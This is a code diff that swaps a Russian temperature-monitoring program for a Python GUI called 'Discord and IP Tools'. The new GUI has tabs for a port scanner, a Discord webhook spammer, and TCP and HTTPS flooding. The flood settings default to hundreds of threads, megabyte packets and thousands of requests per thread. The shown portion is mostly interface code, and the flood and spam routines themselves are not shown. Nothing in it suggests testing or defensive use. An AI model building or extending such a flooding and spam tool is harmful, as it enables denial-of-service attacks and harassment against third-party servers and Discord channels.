@@ -1,870 +1,1285 @@
-import sys
+#!/usr/bin/env python3
+import tkinter as tk
+import customtkinter as ctk
+from tkinter import messagebox, font
+import socket
+import requests
+import json
 import time
 import threading
-import json
+from concurrent.futures import ThreadPoolExecutor
+import subprocess
+import platform
+import queue
+import random
 import os
-import logging
-from datetime import datetime
-from struct import pack, unpack
-import pandas as pd
-import telebot
-from telebot import types
-import requests
-from pymodbus.client import ModbusSerialClient
-from pymodbus.exceptions import ModbusIOException
-from PyQt5.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel, 
-                             QHBoxLayout, QPushButton, QComboBox, QSpinBox, 
-                             QDoubleSpinBox, QGroupBox, QStatusBar, QFileDialog,
-                             QTabWidget, QFrame, QGridLayout, QLineEdit, QCheckBox,
-                             QTextEdit, QScrollArea)
-from PyQt5.QtCore import QTimer, Qt
-from PyQt5.QtGui import QFont, QColor
-from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
-from matplotlib.figure import Figure
-import matplotlib.dates as mdates
-from openpyxl import load_workbook
+import struct
 
-class TelegramBot:
-    def __init__(self, token, chat_id, parent_app):
-        self.bot = telebot.TeleBot(token)
-        self.chat_id = chat_id
-        self.parent = parent_app
-        self.measurement_name = parent_app.telegram_test_name.text()
-        self.send_interval = parent_app.telegram_interval.value()
-        self.running = False
-        self.is_group_chat = str(chat_id).startswith('-')
+# Set appearance mode and default color theme
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("blue")  # We'll override colors with original dark theme
 
-        @self.bot.message_handler(commands=['start', 'help'])
-        def start(message):
-            self.bot.send_message(message.chat.id, "🔔 Бот мониторинга температур активен!\n"
-                               "Доступные команды:\n"
-                               "/graph - получить графики\n"
-                               "/status - статус измерения\n"
-                               "/test - тестовое сообщение\n"
-                               "/thresholds - текущие пороговые значения")
-
-        @self.bot.message_handler(commands=['graph'])
-        def send_graph(message):
-            self.send_current_graphs()
-
-        @self.bot.message_handler(commands=['test'])
-        def test(message):
-            reply = "✅ Тестовое сообщение!"
-            if self.is_group_chat:
-                self.bot.reply_to(message, reply)
-            else:
-                self.bot.send_message(message.chat.id, reply)
-
-        @self.bot.message_handler(commands=['status'])
-        def status(message):
-            status_text = "📊 Статус:\n"
-            status_text += f"Измерение: {self.measurement_name}\n"
-            status_text += f"Интервал отправки: {self.send_interval} сек.\n"
-            status_text += f"Режим: {'Групповой чат' if self.is_group_chat else 'ЛС'}"
-            
-            if self.is_group_chat:
-                self.bot.reply_to(message, status_text)
-            else:
-                self.bot.send_message(message.chat.id, status_text)
-
-        @self.bot.message_handler(commands=['thresholds'])
-        def send_thresholds(message):
-            thresholds_text = "📊 Текущие пороговые значения:\n"
-            for i in range(8):
-                enabled = "✅" if self.parent.threshold_checkboxes[i].isChecked() else "❌"
-                thresholds_text += (f"Канал {i+1}: {enabled} "
-                                  f"{self.parent.threshold_spinboxes[i].value()}°C\n")
-            
-            if self.is_group_chat:
-                self.bot.reply_to(message, thresholds_text)
-            else:
-                self.bot.send_message(message.chat.id, thresholds_text)
-
-    def send_message(self, text):
-        if self.chat_id:
-            self.bot.send_message(self.chat_id, text)
-
-    def send_current_graphs(self):
-        if not self.parent.data_log:
-            self.send_message("📭 Нет данных для графиков!")
+class NetworkToolsGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("axasdfasdafg12039479haisuFFGUAS(D*7f9ju439i2jdnas)")
+        self.root.geometry("800x600")
+        
+        # Configure colors - using original dark theme
+        self.dark_bg = '#191C2E'        # Original dark background
+        self.input_bg = '#21262d'       # Original input background
+        self.border_color = '#30363d'   # Original border color
+        self.text_color = '#c9d1d9'     # Original text color
+        self.header_color = '#58a6ff'   # Original header color
+        self.button_color = '#238636'   # Original button color
+        self.button_hover = '#2ea043'   # Original button hover
+        self.success_color = "#00ff00"  # Green for success
+        self.error_color = "#ff0000"    # Red for error
+        
+        # Configure the root window
+        self.root._set_appearance_mode("dark")
+        self.root.configure(fg_color=self.dark_bg)
+        
+        # Create main frame
+        self.main_frame = ctk.CTkFrame(root, fg_color=self.dark_bg, corner_radius=15)
+        self.main_frame.pack(fill='both', expand=True, padx=10, pady=10)
+        
+        # Create header
+        self.create_header()
+        
+        # Create tabview for tabs
+        self.tabview = ctk.CTkTabview(self.main_frame, fg_color=self.dark_bg, 
+                                     segmented_button_fg_color=self.input_bg,
+                                     segmented_button_selected_color=self.dark_bg,
+                                     segmented_button_selected_hover_color=self.dark_bg,
+                                     segmented_button_unselected_color=self.input_bg,
+                                     segmented_button_unselected_hover_color=self.input_bg,
+                                     text_color=self.text_color)
+        self.tabview.pack(fill='both', expand=True, pady=(10, 0))
+        
+        # Create tabs
+        self.tabview.add("🌍 IP Geolocation")
+        self.tabview.add("🔌 Port Scanner")
+        self.tabview.add("📩 Webhook Spammer")
+        self.tabview.add("📡 IP Pinger")
+        self.tabview.add("! Flooding Tools")  # New tab for flooding tools
+        
+        # Create tab content
+        self.create_geolocation_tab()
+        self.create_port_scanner_tab()
+        self.create_webhook_spammer_tab()
+        self.create_pinger_tab()
+        self.create_flooding_tab()  # New method for flooding tools
+        
+        # Queue for thread communication
+        self.result_queue = queue.Queue()
+        
+    def create_header(self):
+        header_frame = ctk.CTkFrame(self.main_frame, fg_color=self.dark_bg, corner_radius=15)
+        header_frame.pack(fill='x', pady=(0, 10))
+        
+        title_label = ctk.CTkLabel(header_frame, text="🌐 Discord and IP Tools 🌐", 
+                                  font=ctk.CTkFont(family="Arial", size=20, weight="bold"),
+                                  text_color=self.header_color)
+        title_label.pack()
+        
+        subtitle_label = ctk.CTkLabel(header_frame, text="", 
+                                     font=ctk.CTkFont(family="Arial", size=12),
+                                     text_color=self.text_color)
+        subtitle_label.pack()
+        
+    def create_geolocation_tab(self):
+        # Geolocation tab
+        geo_frame = self.tabview.tab("🌍 IP Geolocation")
+        
+        # Input frame
+        input_frame = ctk.CTkFrame(geo_frame, fg_color=self.dark_bg, corner_radius=15)
+        input_frame.pack(fill='x', padx=20, pady=20)
+        
+        ctk.CTkLabel(input_frame, text="Enter IP or Domain:", text_color=self.text_color).pack(anchor='w')
+        
+        self.geo_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                    fg_color=self.input_bg, text_color=self.text_color,
+                                    border_color=self.border_color, border_width=2,
+                                    font=ctk.CTkFont(family="Arial", size=12))
+        self.geo_entry.pack(fill='x', pady=(5, 10))
+        
+        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        button_frame.pack(fill='x')
+        
+        lookup_button = ctk.CTkButton(button_frame, text="🔎 Lookup Location", 
+                                     fg_color=self.button_color, hover_color=self.button_hover,
+                                     corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                     command=self.geo_lookup)
+        lookup_button.pack(side='left')
+        
+        # Add Clear Results button
+        clear_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
+                                   fg_color=self.button_color, hover_color=self.button_hover,
+                                   corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                   command=self.clear_geo_results)
+        clear_button.pack(side='right')
+        
+        # Results frame
+        results_frame = ctk.CTkFrame(geo_frame, fg_color=self.dark_bg, corner_radius=15)
+        results_frame.pack(fill='both', expand=True, padx=20, pady=(10, 20))
+        
+        ctk.CTkLabel(results_frame, text="Results:", text_color=self.text_color).pack(anchor='w')
+        
+        self.geo_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
+                                        corner_radius=10, border_width=2, border_color=self.border_color,
+                                        text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
+        self.geo_results.pack(fill='both', expand=True, pady=(5, 0))
+        
+    def create_port_scanner_tab(self):
+        # Port Scanner tab
+        scan_frame = self.tabview.tab("🔌 Port Scanner")
+        
+        # Input frame
+        input_frame = ctk.CTkFrame(scan_frame, fg_color=self.dark_bg, corner_radius=15)
+        input_frame.pack(fill='x', padx=20, pady=20)
+        
+        ctk.CTkLabel(input_frame, text="Target IP or Domain:", text_color=self.text_color).pack(anchor='w')
+        
+        self.scan_target_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                            fg_color=self.input_bg, text_color=self.text_color,
+                                            border_color=self.border_color, border_width=2,
+                                            font=ctk.CTkFont(family="Arial", size=12))
+        self.scan_target_entry.pack(fill='x', pady=(5, 10))
+        
+        port_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        port_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(port_frame, text="Start Port:", text_color=self.text_color).pack(side='left')
+        
+        self.start_port_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
+                                           fg_color=self.input_bg, text_color=self.text_color,
+                                           border_color=self.border_color, border_width=2,
+                                           font=ctk.CTkFont(family="Arial", size=12))
+        self.start_port_entry.pack(side='left', padx=(5, 20))
+        
+        ctk.CTkLabel(port_frame, text="End Port:", text_color=self.text_color).pack(side='left')
+        
+        self.end_port_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
+                                         fg_color=self.input_bg, text_color=self.text_color,
+                                         border_color=self.border_color, border_width=2,
+                                         font=ctk.CTkFont(family="Arial", size=12))
+        self.end_port_entry.pack(side='left', padx=(5, 0))
+        
+        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        button_frame.pack(fill='x')
+        
+        self.scan_button = ctk.CTkButton(button_frame, text="🔌 Start Scan", 
+                                        fg_color=self.button_color, hover_color=self.button_hover,
+                                        corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                        command=self.start_port_scan)
+        self.scan_button.pack(side='left')
+        
+        self.stop_scan_button = ctk.CTkButton(button_frame, text="⏹ Stop Scan", 
+                                            fg_color=self.button_color, hover_color=self.button_hover,
+                                            corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                            command=self.stop_port_scan, state="disabled")
+        self.stop_scan_button.pack(side='left', padx=(10, 0))
+        
+        # Add Clear Results button
+        clear_scan_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
+                                       fg_color=self.button_color, hover_color=self.button_hover,
+                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                       command=self.clear_scan_results)
+        clear_scan_button.pack(side='right')
+        
+        # Progress bar
+        self.scan_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
+                                              fg_color=self.input_bg, progress_color=self.button_color)
+        self.scan_progress.pack(fill='x', pady=(10, 0))
+        self.scan_progress.set(0)
+        
+        # Results frame
+        results_frame = ctk.CTkFrame(scan_frame, fg_color=self.dark_bg, corner_radius=15)
+        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
+        
+        ctk.CTkLabel(results_frame, text="Scan Results:", text_color=self.text_color).pack(anchor='w')
+        
+        self.scan_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
+                                         corner_radius=10, border_width=2, border_color=self.border_color,
+                                         text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
+        self.scan_results.pack(fill='both', expand=True, pady=(5, 0))
+        
+        self.scan_stop_flag = False
+        
+    def create_webhook_spammer_tab(self):
+        # Webhook Spammer tab
+        webhook_frame = self.tabview.tab("📩 Webhook Spammer")
+        
+        # Input frame
+        input_frame = ctk.CTkFrame(webhook_frame, fg_color=self.dark_bg, corner_radius=15)
+        input_frame.pack(fill='x', padx=20, pady=20)
+        
+        ctk.CTkLabel(input_frame, text="Webhook URL:", text_color=self.text_color).pack(anchor='w')
+        
+        self.webhook_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                        fg_color=self.input_bg, text_color=self.text_color,
+                                        border_color=self.border_color, border_width=2,
+                                        font=ctk.CTkFont(family="Arial", size=12))
+        self.webhook_entry.pack(fill='x', pady=(5, 10))
+        
+        ctk.CTkLabel(input_frame, text="Message:", text_color=self.text_color).pack(anchor='w')
+        
+        self.message_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                        fg_color=self.input_bg, text_color=self.text_color,
+                                        border_color=self.border_color, border_width=2,
+                                        font=ctk.CTkFont(family="Arial", size=12))
+        self.message_entry.pack(fill='x', pady=(5, 10))
+        
+        count_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        count_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(count_frame, text="Number of messages:", text_color=self.text_color).pack(side='left')
+        
+        self.count_entry = ctk.CTkEntry(count_frame, width=100, height=30, corner_radius=10,
+                                      fg_color=self.input_bg, text_color=self.text_color,
+                                      border_color=self.border_color, border_width=2,
+                                      font=ctk.CTkFont(family="Arial", size=12))
+        self.count_entry.pack(side='left', padx=(5, 0))
+        
+        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        button_frame.pack(fill='x')
+        
+        self.spam_button = ctk.CTkButton(button_frame, text="📩 Start Spamming", 
+                                       fg_color=self.button_color, hover_color=self.button_hover,
+                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                       command=self.start_webhook_spam)
+        self.spam_button.pack(side='left')
+        
+        self.stop_spam_button = ctk.CTkButton(button_frame, text="⏹ Stop Spam", 
+                                            fg_color=self.button_color, hover_color=self.button_hover,
+                                            corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                            command=self.stop_webhook_spam, state="disabled")
+        self.stop_spam_button.pack(side='left', padx=(10, 0))
+        
+        # Add Clear Results button
+        clear_spam_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
+                                       fg_color=self.button_color, hover_color=self.button_hover,
+                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                       command=self.clear_spam_results)
+        clear_spam_button.pack(side='right')
+        
+        # Progress bar
+        self.spam_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
+                                              fg_color=self.input_bg, progress_color=self.button_color)
+        self.spam_progress.pack(fill='x', pady=(10, 0))
+        self.spam_progress.set(0)
+        
+        # Results frame
+        results_frame = ctk.CTkFrame(webhook_frame, fg_color=self.dark_bg, corner_radius=15)
+        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
+        
+        ctk.CTkLabel(results_frame, text="Spam Results:", text_color=self.text_color).pack(anchor='w')
+        
+        self.spam_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
+                                         corner_radius=10, border_width=2, border_color=self.border_color,
+                                         text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
+        self.spam_results.pack(fill='both', expand=True, pady=(5, 0))
+        
+        self.spam_stop_flag = False
+        
+    def create_pinger_tab(self):
+        # Pinger tab
+        ping_frame = self.tabview.tab("📡 IP Pinger")
+        
+        # Input frame
+        input_frame = ctk.CTkFrame(ping_frame, fg_color=self.dark_bg, corner_radius=15)
+        input_frame.pack(fill='x', padx=20, pady=20)
+        
+        ctk.CTkLabel(input_frame, text="Target IP or Domain:", text_color=self.text_color).pack(anchor='w')
+        
+        self.ping_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                     fg_color=self.input_bg, text_color=self.text_color,
+                                     border_color=self.border_color, border_width=2,
+                                     font=ctk.CTkFont(family="Arial", size=12))
+        self.ping_entry.pack(fill='x', pady=(5, 10))
+        
+        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        button_frame.pack(fill='x')
+        
+        self.ping_button = ctk.CTkButton(button_frame, text="📡 Start Ping", 
+                                       fg_color=self.button_color, hover_color=self.button_hover,
+                                       corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                       command=self.start_ping)
+        self.ping_button.pack(side='left')
+        
+        self.stop_ping_button = ctk.CTkButton(button_frame, text="⏹ Stop Ping", 
+                                            fg_color=self.button_color, hover_color=self.button_hover,
+                                            corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                            command=self.stop_ping, state="disabled")
+        self.stop_ping_button.pack(side='left', padx=(10, 0))
+        
+        clear_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
+                                   fg_color=self.button_color, hover_color=self.button_hover,
+                                   corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                   command=self.clear_ping_results)
+        clear_button.pack(side='right')
+        
+        # Results frame
+        results_frame = ctk.CTkFrame(ping_frame, fg_color=self.dark_bg, corner_radius=15)
+        results_frame.pack(fill='both', expand=True, padx=20, pady=(10, 20))
+        
+        ctk.CTkLabel(results_frame, text="Ping Results:", text_color=self.text_color).pack(anchor='w')
+        
+        self.ping_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
+                                         corner_radius=10, border_width=2, border_color=self.border_color,
+                                         text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
+        self.ping_results.pack(fill='both', expand=True, pady=(5, 0))
+        
+        self.ping_stop_flag = False
+        
+    def create_flooding_tab(self):
+        # Flooding Tools tab
+        flood_frame = self.tabview.tab("! Flooding Tools")
+        
+        # Create notebook for TCP and HTTPS flooding
+        self.flood_notebook = ctk.CTkTabview(flood_frame, fg_color=self.dark_bg,
+                                           segmented_button_fg_color=self.input_bg,
+                                           segmented_button_selected_color=self.dark_bg,
+                                           segmented_button_selected_hover_color=self.dark_bg,
+                                           segmented_button_unselected_color=self.input_bg,
+                                           segmented_button_unselected_hover_color=self.input_bg,
+                                           text_color=self.text_color)
+        self.flood_notebook.pack(fill='both', expand=True, padx=10, pady=10)
+        
+        # Create sub-tabs for different flooding types
+        self.flood_notebook.add("TCP Flood")
+        self.flood_notebook.add("HTTPS Flood")
+        
+        # Create content for each flooding type
+        self.create_tcp_flood_tab()
+        self.create_https_flood_tab()
+        
+    def create_tcp_flood_tab(self):
+        # TCP Flooding tab
+        tcp_frame = self.flood_notebook.tab("TCP Flood")
+        
+        # Input frame
+        input_frame = ctk.CTkFrame(tcp_frame, fg_color=self.dark_bg, corner_radius=15)
+        input_frame.pack(fill='x', padx=20, pady=20)
+        
+        # Target input
+        ctk.CTkLabel(input_frame, text="Target IP or Domain:", text_color=self.text_color).pack(anchor='w')
+        
+        self.tcp_target_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                          fg_color=self.input_bg, text_color=self.text_color,
+                                          border_color=self.border_color, border_width=2,
+                                          font=ctk.CTkFont(family="Arial", size=12))
+        self.tcp_target_entry.pack(fill='x', pady=(5, 10))
+        
+        # Port input
+        port_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        port_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(port_frame, text="Port:", text_color=self.text_color).pack(side='left')
+        
+        self.tcp_port_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
+                                        fg_color=self.input_bg, text_color=self.text_color,
+                                        border_color=self.border_color, border_width=2,
+                                        font=ctk.CTkFont(family="Arial", size=12))
+        self.tcp_port_entry.pack(side='left', padx=(5, 20))
+        
+        ctk.CTkLabel(port_frame, text="Threads:", text_color=self.text_color).pack(side='left')
+        
+        self.tcp_threads_entry = ctk.CTkEntry(port_frame, width=100, height=30, corner_radius=10,
+                                           fg_color=self.input_bg, text_color=self.text_color,
+                                           border_color=self.border_color, border_width=2,
+                                           font=ctk.CTkFont(family="Arial", size=12))
+        self.tcp_threads_entry.pack(side='left', padx=(5, 0))
+        self.tcp_threads_entry.insert(0, "250")  # Default value - increased
+        
+        # Packet size frame
+        packet_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        packet_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(packet_frame, text="Packet Size (KB):", text_color=self.text_color).pack(side='left')
+        
+        self.tcp_packet_size_entry = ctk.CTkEntry(packet_frame, width=100, height=30, corner_radius=10,
+                                               fg_color=self.input_bg, text_color=self.text_color,
+                                               border_color=self.border_color, border_width=2,
+                                               font=ctk.CTkFont(family="Arial", size=12))
+        self.tcp_packet_size_entry.pack(side='left', padx=(5, 20))
+        self.tcp_packet_size_entry.insert(0, "1024")  # Default 1MB
+        
+        ctk.CTkLabel(packet_frame, text="Socket Timeout (s):", text_color=self.text_color).pack(side='left')
+        
+        self.tcp_timeout_entry = ctk.CTkEntry(packet_frame, width=100, height=30, corner_radius=10,
+                                           fg_color=self.input_bg, text_color=self.text_color,
+                                           border_color=self.border_color, border_width=2,
+                                           font=ctk.CTkFont(family="Arial", size=12))
+        self.tcp_timeout_entry.pack(side='left', padx=(5, 0))
+        self.tcp_timeout_entry.insert(0, "2")  # Default timeout
+        
+        # Button frame
+        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        button_frame.pack(fill='x')
+        
+        self.tcp_flood_button = ctk.CTkButton(button_frame, text="🌊 Start TCP Flood", 
+                                           fg_color=self.button_color, hover_color=self.button_hover,
+                                           corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                           command=self.start_tcp_flood)
+        self.tcp_flood_button.pack(side='left')
+        
+        self.stop_tcp_flood_button = ctk.CTkButton(button_frame, text="⏹ Stop Flood", 
+                                                fg_color=self.button_color, hover_color=self.button_hover,
+                                                corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                                command=self.stop_tcp_flood, state="disabled")
+        self.stop_tcp_flood_button.pack(side='left', padx=(10, 0))
+        
+        # Add Clear Results button
+        clear_tcp_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
+                                      fg_color=self.button_color, hover_color=self.button_hover,
+                                      corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                      command=self.clear_tcp_flood_results)
+        clear_tcp_button.pack(side='right')
+        
+        # Progress bar
+        self.tcp_flood_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
+                                                  fg_color=self.input_bg, progress_color=self.button_color)
+        self.tcp_flood_progress.pack(fill='x', pady=(10, 0))
+        self.tcp_flood_progress.set(0)
+        
+        # Results frame
+        results_frame = ctk.CTkFrame(tcp_frame, fg_color=self.dark_bg, corner_radius=15)
+        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
+        
+        ctk.CTkLabel(results_frame, text="TCP Flood Results:", text_color=self.text_color).pack(anchor='w')
+        
+        self.tcp_flood_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
+                                             corner_radius=10, border_width=2, border_color=self.border_color,
+                                             text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
+        self.tcp_flood_results.pack(fill='both', expand=True, pady=(5, 0))
+        
+        self.tcp_flood_stop_flag = False
+        self.tcp_flood_packets_sent = 0
+        self.tcp_flood_bytes_sent = 0
+        
+    def create_https_flood_tab(self):
+        # HTTPS Flooding tab
+        https_frame = self.flood_notebook.tab("HTTPS Flood")
+        
+        # Input frame
+        input_frame = ctk.CTkFrame(https_frame, fg_color=self.dark_bg, corner_radius=15)
+        input_frame.pack(fill='x', padx=20, pady=20)
+        
+        # Target input
+        ctk.CTkLabel(input_frame, text="Target URL (include https://):", text_color=self.text_color).pack(anchor='w')
+        
+        self.https_target_entry = ctk.CTkEntry(input_frame, height=40, corner_radius=10,
+                                            fg_color=self.input_bg, text_color=self.text_color,
+                                            border_color=self.border_color, border_width=2,
+                                            font=ctk.CTkFont(family="Arial", size=12))
+        self.https_target_entry.pack(fill='x', pady=(5, 10))
+        
+        # Threads and requests input
+        settings_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        settings_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(settings_frame, text="Threads:", text_color=self.text_color).pack(side='left')
+        
+        self.https_threads_entry = ctk.CTkEntry(settings_frame, width=100, height=30, corner_radius=10,
+                                             fg_color=self.input_bg, text_color=self.text_color,
+                                             border_color=self.border_color, border_width=2,
+                                             font=ctk.CTkFont(family="Arial", size=12))
+        self.https_threads_entry.pack(side='left', padx=(5, 20))
+        self.https_threads_entry.insert(0, "200")  # Default value - increased
+        
+        ctk.CTkLabel(settings_frame, text="Requests per thread:", text_color=self.text_color).pack(side='left')
+        
+        self.https_requests_entry = ctk.CTkEntry(settings_frame, width=100, height=30, corner_radius=10,
+                                              fg_color=self.input_bg, text_color=self.text_color,
+                                              border_color=self.border_color, border_width=2,
+                                              font=ctk.CTkFont(family="Arial", size=12))
+        self.https_requests_entry.pack(side='left', padx=(5, 0))
+        self.https_requests_entry.insert(0, "5000")  # Default value - increased
+        
+        # Data size frame
+        data_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        data_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(data_frame, text="Data Size (KB):", text_color=self.text_color).pack(side='left')
+        
+        self.https_data_size_entry = ctk.CTkEntry(data_frame, width=100, height=30, corner_radius=10,
+                                               fg_color=self.input_bg, text_color=self.text_color,
+                                               border_color=self.border_color, border_width=2,
+                                               font=ctk.CTkFont(family="Arial", size=12))
+        self.https_data_size_entry.pack(side='left', padx=(5, 20))
+        self.https_data_size_entry.insert(0, "512")  # Default 512KB
+        
+        ctk.CTkLabel(data_frame, text="Connection Timeout (s):", text_color=self.text_color).pack(side='left')
+        
+        self.https_timeout_entry = ctk.CTkEntry(data_frame, width=100, height=30, corner_radius=10,
+                                             fg_color=self.input_bg, text_color=self.text_color,
+                                             border_color=self.border_color, border_width=2,
+                                             font=ctk.CTkFont(family="Arial", size=12))
+        self.https_timeout_entry.pack(side='left', padx=(5, 0))
+        self.https_timeout_entry.insert(0, "5")  # Default timeout
+        
+        # Method selection frame
+        method_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        method_frame.pack(fill='x', pady=(0, 10))
+        
+        ctk.CTkLabel(method_frame, text="HTTP Method:", text_color=self.text_color).pack(side='left')
+        
+        self.https_method_var = tk.StringVar(value="POST")
+        methods = ["GET", "POST", "PUT", "DELETE", "HEAD"]
+        
+        for method in methods:
+            rb = ctk.CTkRadioButton(method_frame, text=method, variable=self.https_method_var, value=method,
+                                  fg_color=self.button_color, hover_color=self.button_hover,
+                                  text_color=self.text_color)
+            rb.pack(side='left', padx=(10, 0))
+        
+        # Button frame
+        button_frame = ctk.CTkFrame(input_frame, fg_color=self.dark_bg, corner_radius=15)
+        button_frame.pack(fill='x')
+        
+        self.https_flood_button = ctk.CTkButton(button_frame, text="🌊 Start HTTPS Flood", 
+                                             fg_color=self.button_color, hover_color=self.button_hover,
+                                             corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                             command=self.start_https_flood)
+        self.https_flood_button.pack(side='left')
+        
+        self.stop_https_flood_button = ctk.CTkButton(button_frame, text="⏹ Stop Flood", 
+                                                  fg_color=self.button_color, hover_color=self.button_hover,
+                                                  corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                                  command=self.stop_https_flood, state="disabled")
+        self.stop_https_flood_button.pack(side='left', padx=(10, 0))
+        
+        # Add Clear Results button
+        clear_https_button = ctk.CTkButton(button_frame, text="🗑 Clear Results", 
+                                        fg_color=self.button_color, hover_color=self.button_hover,
+                                        corner_radius=10, height=40, font=ctk.CTkFont(family="Arial", size=12, weight="bold"),
+                                        command=self.clear_https_flood_results)
+        clear_https_button.pack(side='right')
+        
+        # Progress bar
+        self.https_flood_progress = ctk.CTkProgressBar(input_frame, height=15, corner_radius=7,
+                                                    fg_color=self.input_bg, progress_color=self.button_color)
+        self.https_flood_progress.pack(fill='x', pady=(10, 0))
+        self.https_flood_progress.set(0)
+        
+        # Results frame
+        results_frame = ctk.CTkFrame(https_frame, fg_color=self.dark_bg, corner_radius=15)
+        results_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
+        
+        ctk.CTkLabel(results_frame, text="HTTPS Flood Results:", text_color=self.text_color).pack(anchor='w')
+        
+        self.https_flood_results = ctk.CTkTextbox(results_frame, fg_color=self.input_bg, 
+                                               corner_radius=10, border_width=2, border_color=self.border_color,
+                                               text_color=self.text_color, font=ctk.CTkFont(family="Consolas", size=12))
+        self.https_flood_results.pack(fill='both', expand=True, pady=(5, 0))
+        
+        self.https_flood_stop_flag = False
+        self.https_flood_requests_sent = 0
+        self.https_flood_bytes_sent = 0
+        
+    def geo_lookup(self):
+        ip = self.geo_entry.get().strip()
+        if not ip:
+            messagebox.showerror("Error", "Please enter an IP or domain!")
             return
-        
-        self.parent.figure.savefig("temp_graph.png", dpi=150)
-        with open("temp_graph.png", "rb") as graph_file:
-            if self.is_group_chat:
-                self.bot.send_photo(self.chat_id, graph_file, 
-                                 reply_to_message_id=self.parent.last_group_message_id,
-                                 caption="📈 Графики температур")
-            else:
-                self.bot.send_photo(self.chat_id, graph_file, 
-                                 caption="📈 Графики температур")
-
-    def run(self):
-        if not self.running:
-            self.running = True
-            threading.Thread(target=self.bot.polling, daemon=True).start()
-
-class ModernTemperatureMonitor(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.setWindowTitle("Мониторинг температур МВ110-8А")
-        self.setGeometry(100, 100, 1200, 900)
-        
-        # Параметры подключения
-        self.port = 'COM3'
-        self.baudrate = 9600
-        self.parity = 'N'
-        self.stopbits = 1
-        self.bytesize = 8
-        self.timeout = 1.0
-        self.slave_id = 16
-        self.update_interval = 2000
-        
-        # Данные
-        self.data_log = []
-        self.excel_file = "temperature_data.xlsx"
-        self.config_file = "config.json"
-        self.last_group_message_id = None
-        self.excel_auto_save = False
-        self.excel_writer = None
